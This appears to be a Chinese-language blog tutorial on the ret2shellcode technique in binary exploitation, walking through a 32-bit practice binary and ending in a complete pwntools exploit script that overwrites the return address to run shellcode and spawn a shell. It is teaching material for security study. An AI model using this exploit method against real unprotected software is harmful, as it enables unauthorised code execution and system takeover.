发表于2026-05-28|更新于2026-05-28|逆向PWN

一.如何解决ret2text的局限性

ret2text漏洞利用依赖于程序中存在执行system(“/bin/sh”)的函数，如果没有这个函数，如何破解？

以下有方法可以看到：

 ret2shellcode

没有执行shell的函数，没有开启NX保护

传入自定义shellcode

 ret2libc

开启NX保护

使用libc函数，leak libc + ROP

More：ret2csu，ret2syscall，stack pivot，ret2dl_resolve

 

二.什么是shellcode?

shellcode是黑客编写的用于实行特定功能的汇编代码，通常是开启一个shell

例如：execve(“/bin/sh”,null,null);

 

三.Linux的系统调用

linux 系统调用号表_linux系统调用号_Anciety的博客-CSDN博客

32位目录下：/usr/incude/asm/ubistd_32.h

 

内涵所有的调用号

 

这节课我们主要用到execve

 

 

调用方式：
eax 系统调用号
ebx 第1个参数
ecx 第2个参数
edx 第3个参数
esi 第4个参数
edi 第5个参数
int0x80

五.深入了解NX保护

NX又称为DEP，数据执行保护：可写的不执行，可执行的不可写

 

六.32位实例 ret2shellcode2

没有源码，只有程序

首先查看保护，可见没有开启保护；

查看有没有system函数，可见没有；

切换插件pwndbg：vim ~/.gdbinit

 

 

那就先查看main函数：

 

那就分析一下它调用了哪些函数，可以看到调用setvbuf函数，这是一个优化i/o读写的函数，可以先不管

后面有一个puts()函数，可以注意前面输入的参数，可以使命令查看一下：

 

 

后面可以看到gets()函数，这个将是我们后面的突破点，要让他输入shllcode

strcpy()函数，拷贝0x64字节，从[esp+0x1c]拷贝，拷贝到0x804a080，可以看一下里面有啥：

 

还没进行拷贝，是空的，因为没有执行嘛

思路：分析+119行汇编得知，是从[esp+0x1c]拷贝，也会是从gets获取到的内容拷贝，所以，可以先填充shellcode再利用gets覆盖返回值为拷贝到哪里的位置0x804a080，但是有个问题就是要看一下这个段如果写入shellcode是否有执行权限

 

所以接下来我们要看一下它所在代码段在哪里，是否有执行权限？

查看要拷贝的那个地址所在的段：readelf -S ret2shellcode2（注意大小写，一定是大S）

在peda中用：readelf就行

 

可见似乎在.bss段

 

查看这个段有没有运行权限

gdb在main下个断点b main，然后让程序跑起来，再使用vmmap命令查看段的权限：

 

可见它具有执行权限。

 

查看溢出点：cyclic 200       复制运行粘贴

报出地址：

 

 

查看偏移：cyclic -l 0x62616164

 

 

编写expret2shellcode2.py：自动

 

from pwn import *

 

context(arch = “i386”,os = “linux”)   #指定环境变量 加一个参数，log_level = “debug 可以输出详情

 

p = process(“./ret2shellcode2”)

 

shellcode = asm(shellcraft.sh())

 

payload = shellcode.ljust(112,’A’) + p32(0x804a080)#ljust确保覆盖填充到到112

 

p.sendline(payload)

 

p.interactive()

成功获取shell
